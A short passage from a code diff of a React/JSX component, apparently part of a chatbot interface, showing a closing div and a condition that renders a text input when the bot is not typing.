+        </div>
       )}
 
       {isTextInputActive && currentTextInputConfig && !isBotTyping && (
